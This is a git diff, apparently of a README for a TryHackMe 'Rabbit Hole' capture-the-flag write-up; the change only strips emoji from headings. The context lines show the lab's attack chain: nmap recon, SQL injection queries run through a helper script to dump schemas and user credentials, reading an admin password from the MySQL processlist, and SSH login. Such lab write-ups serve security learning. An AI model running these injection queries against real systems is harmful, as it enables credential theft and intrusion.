@@ -1,6 +1,6 @@
 # TryHackMe: Rabbit Hole Walkthrough — Full Exploit & Capture-the-Flag Guide
 
-## 🔍 Challenge Overview
+##  Challenge Overview
 
 **Platform:** TryHackMe
 **Room Name:** Rabbit Hole
@@ -15,7 +15,7 @@ Keywords: tryhackme rabbit hole writeup, second-order sqli, processlist mysql ex
 
 ---
 
-## 🛠 Step 1: Initial Reconnaissance
+##  Step 1: Initial Reconnaissance
 
 ```bash
 nmap -T4 -n -sC -sV -Pn -p- 10.10.173.12
@@ -38,7 +38,7 @@ Identified login/register form and "Last Logins" feature reflecting usernames (p
 
 ---
 
-## 🧪 Step 2: SQL Injection Detection
+##  Step 2: SQL Injection Detection
 
 Test Payload:
 
@@ -58,7 +58,7 @@ This confirms 2 columns are expected.
 
 ---
 
-## 🧬 Step 3: Extract Database Names
+##  Step 3: Extract Database Names
 
 ```bash
 python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'
@@ -72,7 +72,7 @@ information_schema,web
 
 ---
 
-## 🗂 Step 4: Extract Table Names from `web`
+##  Step 4: Extract Table Names from `web`
 
 ```bash
 python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema="web"'
@@ -86,7 +86,7 @@ users,logins
 
 ---
 
-## 🧱 Step 5: Extract Columns from `users`
+##  Step 5: Extract Columns from `users`
 
 ```bash
 python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema="web" AND table_name="users"'
@@ -100,7 +100,7 @@ id,username,password,group
 
 ---
 
-## 🔐 Step 6: Dump User Data
+##  Step 6: Dump User Data
 
 ```bash
 python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(id,":",username,":",password,":",`group` SEPARATOR "\n") FROM web.users WHERE id<4'
@@ -116,7 +116,7 @@ python3 sqli_automate2.py 'http://10.10.173.12/' 'SELECT group_concat(id,":",use
 
 ---
 
-## 👁️ Step 7: Monitor `PROCESSLIST` for Admin Password
+##  Step 7: Monitor `PROCESSLIST` for Admin Password
 
 Repeatedly run:
 
@@ -134,7 +134,7 @@ Extract the cleartext password inside the `md5()` function.
 
 ---
 
-## 💻 Step 8: SSH Login as Admin
+##  Step 8: SSH Login as Admin
 
 ```bash
 ssh admin@10.10.173.12
@@ -163,7 +163,7 @@ THM{**********************************************}
 
 ---
 
-## 🧰 Tools & Techniques Used
+##  Tools & Techniques Used
 
 * `nmap`, `curl`, `Burp Suite`
 * Manual SQL injection testing
@@ -173,7 +173,7 @@ THM{**********************************************}
 
 ---
 
-## 📁 Included Scripts
+##  Included Scripts
 
 ### `sqli_automation.py`
 
@@ -189,7 +189,7 @@ Multi-threaded script to capture live SQL queries from MySQL `information_schema
 
 ---
 
-## ✍️ Writeup by: Mohsin Arif
+##  Writeup by: Mohsin Arif
 
 **GitHub:** [https://github.com/mhsn1](https://github.com/mhsn1)
 **TryHackMe:** [https://tryhackme.com/p/mhsn1](https://tryhackme.com/p/mhsn1)
